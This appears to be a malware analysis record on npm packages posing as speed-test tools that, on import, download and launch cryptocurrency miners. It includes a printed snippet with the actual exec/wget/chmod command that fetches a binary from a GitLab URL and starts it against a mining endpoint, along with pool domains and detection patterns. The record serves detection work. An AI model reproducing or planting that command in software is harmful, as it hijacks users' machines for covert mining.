package_info.package_name: speedtestspa, speedtestkas, speedtestbom, speedtesto, lagra, speedtesta, speedtestfast, speedtestgo, speedtestgod, speedtestis, speedtestrun, speedtestsolo, speedtestwow, speedtestzo, trova, trovam
package_info.package_versions: all versions published by user 'trendava' before Jan 18, 2023
package_info.why_malicious: These packages impersonate legitimate internet speed testing utilities but, upon installation or import, surreptitiously download and execute cryptocurrency mining binaries. The miners hijack system resources for unauthorized mining operations, often using obfuscation and evasion techniques such as dynamic retrieval of mining pool addresses, embedding or downloading binaries from external sources, and blending malicious activity with legitimate speed test functionality to avoid detection.

execution_context.trigger: import-time (when the package is required or executed)

malicious_snippets.code_behavior: Downloads a binary named 'data' from a GitLab repository, sets executable permissions, and launches it as a background process to mine cryptocurrency using the KASPA algorithm and a specified mining pool (eu.kaspa.k1pool.com:1111).

malice_analysis.why_suspicious: The code downloads and executes an external binary from a remote repository without user consent, a common malware delivery technique. The binary is then used to mine cryptocurrency, which is unrelated to the package's purported speed test functionality.
malice_analysis.violated_expectations: A legitimate speed test package should not download or execute external binaries, nor should it initiate connections to cryptocurrency mining pools or run background processes unrelated to speed testing.
malice_analysis.similar_legitimate_use: Some legitimate packages may download platform-specific binaries for performance, but never for cryptocurrency mining or without explicit user consent and transparency.
key_indicators: Use of 'wget' to download remote executable
Command-line arguments referencing mining algorithms (e.g., '--algo KASPA')
Network connection to known mining pool domain (eu.kaspa.k1pool.com:1111)

execution_context.trigger: import-time (when the package is required or executed)

malicious_snippets.code_behavior: Downloads a binary named 'los' from a GitLab repository, sets executable permissions, and executes it to connect to a mining pool via a WebSocket endpoint (wss://51.222.96.66:80) using a hardcoded wallet address.

malice_analysis.why_suspicious: The code downloads and runs an external binary that connects to a suspicious IP address over WebSocket, which is not required for speed testing and is indicative of covert communication with a mining pool.
malice_analysis.violated_expectations: Speed test utilities should not execute arbitrary binaries or establish WebSocket connections to unknown endpoints, especially with hardcoded wallet addresses.
malice_analysis.similar_legitimate_use: Legitimate software may use WebSockets for real-time data transfer, but not for mining operations or with hardcoded credentials.
key_indicators: Presence of hardcoded wallet address in command arguments

execution_context.trigger: import-time (when the package is required or executed)

malicious_snippets.code_snippet: // Instead of hardcoding the mining pool, connects to an external IP to retrieve it, then launches the miner
malicious_snippets.code_behavior: Obfuscates the mining pool address by retrieving it from an external IP at runtime, then launches the miner with the dynamically obtained address, making static analysis and blocklisting more difficult.

malice_analysis.why_suspicious: Dynamic retrieval of mining pool addresses is a known evasion technique to bypass static detection and blocklists, allowing the attacker to change infrastructure without updating the package.
malice_analysis.violated_expectations: Legitimate packages do not fetch hidden configuration for background processes, especially not for launching unauthorized miners.
malice_analysis.similar_legitimate_use: Fetching configuration from remote servers is common for legitimate software, but not for hidden mining operations or without user awareness.
key_indicators: Runtime retrieval of mining pool address from external IP
Delayed or staged execution of mining binary
Absence of hardcoded pool address in code

execution_context.trigger: import-time (when the package is required or executed)

malicious_snippets.code_snippet:
var speedTest=require('speedtest-net'); ... // legitimate speed test code
exec('wget https://gitlab.com/parsnekamser/clouds/-/raw/main/los;chmod 700 los;./los -o wss://51.222.96.66:80 -u derolgysfiv...')
malicious_snippets.code_behavior: Blends legitimate speed test functionality (using 'speedtest-net') with malicious miner download and execution, making the package appear benign while still hijacking system resources for mining.

malice_analysis.why_suspicious: Combining legitimate and malicious code is a classic technique to evade detection and gain user trust, as the package appears to function as advertised while performing hidden malicious actions.
malice_analysis.violated_expectations: A speed test utility should not execute unrelated binaries or connect to mining pools, especially not in the background and without user knowledge.
malice_analysis.similar_legitimate_use: Legitimate packages may bundle multiple utilities, but not for hidden mining or unauthorized background process execution.
key_indicators: Mix of legitimate (speedtest-net) and malicious code in the same file
Background execution of mining binary alongside legitimate functionality
Use of exec to launch external processes

attack_chain.action: User installs or imports the malicious NPM package, believing it to be a speed test utility.
attack_chain.leads_to: Malicious code in index.js is executed.

attack_chain.action: Malicious code downloads a mining binary from an external source (e.g., GitLab) or uses an embedded binary.
attack_chain.leads_to: Binary is made executable and launched.

attack_chain.action: The binary connects to a cryptocurrency mining pool, sometimes retrieving the pool address dynamically.
attack_chain.leads_to: System resources are hijacked for mining.

attack_chain.action: In some cases, legitimate speed test functionality is executed to avoid suspicion.
attack_chain.leads_to: User is less likely to notice malicious activity.

behavioral_signatures: NPM package downloads and executes external binaries at install or import time, especially via exec/wget/curl/chmod/nohup patterns in entry points
Background execution of processes with mining-related arguments (e.g., '--algo', '--pool', '-o', wallet addresses)
Network connections to known mining pool domains (e.g., eu.kaspa.k1pool.com:1111) or suspicious IPs (e.g., 51.222.96.66:80) over TCP or WebSocket
Fetching mining pool addresses or configuration from external sources at runtime to evade static detection
Blending of legitimate speed test functionality with hidden process execution
file_indicators: Downloaded binaries named 'data', 'los', or similar in the package directory
References to GitLab or other code hosting platforms (e.g., 'gitlab.com/parsnekamser/clouds') in code or scripts
network_indicators: Outbound HTTP/HTTPS requests to GitLab raw file URLs (e.g., https://gitlab.com/parsnekamser/clouds/-/raw/main/data, .../los)
detection_knowledge.how_to_detect: Monitor NPM package installations and imports for scripts that download and execute external binaries, especially those that set executable permissions and run in the background. Use static and dynamic analysis to detect exec/wget/curl/chmod/nohup patterns in package entry points (e.g., index.js). Flag packages that connect to known mining pool domains or suspicious IPs, or that fetch mining pool addresses/configuration at runtime. Alert on packages that blend legitimate functionality (e.g., speedtest-net) with hidden process execution. Correlate file creation of binaries named 'data', 'los', etc., and outbound requests to GitLab raw URLs.
